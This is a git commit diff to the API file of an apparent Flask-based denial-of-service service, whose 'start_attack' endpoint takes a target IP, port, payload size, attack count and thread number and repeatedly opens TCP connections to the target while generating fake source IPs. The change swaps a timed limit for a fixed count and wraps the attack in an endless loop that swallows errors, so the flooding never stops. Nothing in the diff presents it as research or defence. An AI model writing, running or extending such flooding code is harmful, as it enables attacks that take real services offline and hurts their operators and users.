8655f803fb60517ad181c57ac76bc12609619aad
Tech4Ever <77576951+MULTI-GAMER-2@users.noreply.github.com>
2024-04-13 22:50:27 +0100

    Update index.py

--- api/index.py
+++ api/index.py
@@ -3,7 +3,6 @@ from contextlib import suppress
 import socket
 import random
 import os
-import time  # Import the time module
 
 app = Flask(__name__)
 
@@ -11,16 +10,12 @@ app = Flask(__name__)
 def start_attack():
     data = request.get_json()
     num_bytes = data.get('payload', 1024)
-    time_duration = int(data.get('time', 60))  # Rename attack_num to time for clarity
+    num_attacks = data.get('attack_num', 100000)
     target_ip = data.get('ip', "0.0.0.0")
-    target_port = int(data.get('port', 80))
-
-    start_time = time.time()  # Record the start time of the attack
+    target_port = data.get('port', 80)
 
     def attack():
-        while True:  # Run indefinitely until stopped
-            if time.time() - start_time >= time_duration:  # Check if the attack duration has elapsed
-                break  # Exit the loop if the time is up
+        for _ in range(int(num_attacks)):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target_ip, int(target_port)))
             fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
@@ -31,12 +26,12 @@ def start_attack():
             s.close()
 
     for _ in range(int(data.get('threads', 10))):
-        with suppress(Exception):
+      while True:
+
+
+          with suppress(Exception):
             attack()
-    
-    # Sleep for the remaining time if needed
-    
-    # Return success message
+
     return jsonify({'success': True, 'message': 'Attack finished successfully.'})
 
 if __name__ == '__main__':
